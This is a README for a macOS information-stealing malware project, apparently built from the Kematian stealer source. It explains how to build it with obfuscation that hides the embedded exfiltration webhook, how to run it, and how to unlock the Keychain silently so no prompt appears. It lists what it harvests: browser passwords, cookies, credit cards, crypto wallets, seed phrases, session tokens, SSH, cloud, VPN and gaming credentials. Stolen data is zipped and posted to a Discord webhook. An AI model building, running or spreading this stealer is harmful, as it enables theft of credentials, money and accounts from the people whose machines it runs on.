# Kematian-Mac

**Standalone macOS-only project** — not part of Overlord / StuartPirate.

Harvest binary built from **Kematian-main** recovery source (`recovery/` is macOS code only — no Windows/Linux paths). Runs once on a Mac, collects browser credentials and related data, zips the results, and posts to a **Discord webhook**.

Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This repo is only the independent Mac executable.

## Build on GitHub Actions (recommended)

1. Repo **Settings → Secrets and variables → Actions** → add secret:
   - `DISCORD_WEBHOOK` = `https://discord.com/api/webhooks/ID/TOKEN`
2. **Actions → macOS Build (CGO) → Run workflow**
   - **Obfuscate with garble** — on by default (same idea as Overlord agent)
   - **Garble -literals** — on by default (obfuscates embedded webhook string)
   - Optional: paste a different webhook in **discord_webhook** (overrides the secret)
3. Download artifact **stuart-mac-stealer-macos** (`kematian-darwin-arm64`, `kematian-darwin-amd64`, zip)

The webhook is **baked into the binary** at build time (`main.defaultWebhook`). You do not need to pass it at runtime unless you want to override with `-webhook`.

Pushes to `main` and version tags `v*` also run this workflow (garble + `-literals` enabled, uses `DISCORD_WEBHOOK` secret).

## Build locally (on a Mac)

```bash
chmod +x scripts/build-macos.sh
DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh

# With garble (like Overlord agent):
go install mvdan.cc/garble@latest
OBFUSCATE=true GARBLE_FLAGS="-literals" DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
```

Outputs:

- `dist/kematian-darwin-arm64`
- `dist/kematian-darwin-amd64`

Requires **CGO** (`CGO_ENABLED=1`, default on macOS).

## Run

```bash
chmod +x dist/kematian-darwin-arm64
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/ID/TOKEN" ./dist/kematian-darwin-arm64
```

Or:

```bash
./dist/kematian-darwin-arm64 -webhook "https://discord.com/api/webhooks/ID/TOKEN"
```

`-quiet` reduces console output.

### macOS login password (silent Keychain unlock)

Chrome/Brave/Edge saved passwords need the **login Keychain** unlocked. Without your Mac password, `security` may fail (`exit status 128`) or show a GUI prompt.

```bash
./kematian-darwin-arm64 -mac-password 'YourMacLoginPassword'
# or
KEMATIAN_MAC_PASSWORD='YourMacLoginPassword' ./kematian-darwin-arm64
```

This runs `security unlock-keychain` before harvest — **no password modal**. The Mac login password is also added to `password_candidates.json` for wallet cracking.

### Discord upload size

Webhook uploads are split into **≤8MB** zip parts. Discord returns `HTTP 413 Request entity too large` if a single POST exceeds their limit (~8–25MB depending on payload). Multi-part uploads look like `hostname-kematian-arm64-part1.zip`, `part2.zip`, etc.

## What it collects

- Passwords, cookies, history, bookmarks, autofill, credit cards  
- Browser extensions (**229 named wallet IDs only** — [targeted_extensions.csv](https://gist.github.com/jiayuchann/ba3cd9f4f430a9351fdff75869959853) gist + curated sources; unknown IDs dropped)
- Desktop wallets (Exodus, Ledger Live, Electrum, Sparrow, Wasabi, Daedalus, and more)
- Desktop + browser wallet data, Discord tokens, SSH/cloud keys  
- Sensitive files and seed phrase scan  
- **Telegram** sessions (`tdata`)
- **App credentials:** Wi‑Fi passwords, FileZilla saved servers
- **Gaming:** Steam, Battle.net, Epic, Riot, Ubisoft
- **VPN:** NordVPN, WireGuard, OpenVPN, Mullvad, Tunnelblick profiles
- **Password candidates:** browser + keychain + mutations + app/VPN passwords (`password_candidates.json`)

## Discord payload

- Embed with harvest counts (passwords, cookies, history, wallets, etc.)
- Zip attachment: `harvest.json`, `summary.txt`, `cookies.txt` (Netscape format when present)

Max upload size is capped under Discord’s 25MB webhook limit.

## Source

`recovery/` is from `Kematian-main/native/recovery`. Plugin/UI files from Kematian-main are not used here.